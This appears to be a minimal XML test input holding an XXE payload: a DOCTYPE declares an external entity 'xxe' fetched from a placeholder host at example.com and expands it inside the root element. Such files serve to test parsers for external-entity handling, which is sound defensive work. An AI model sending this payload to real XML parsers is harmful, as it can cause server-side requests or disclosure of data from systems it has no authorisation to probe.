<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://example.com/resource.dtd">
]>
<root>&xxe;</root> 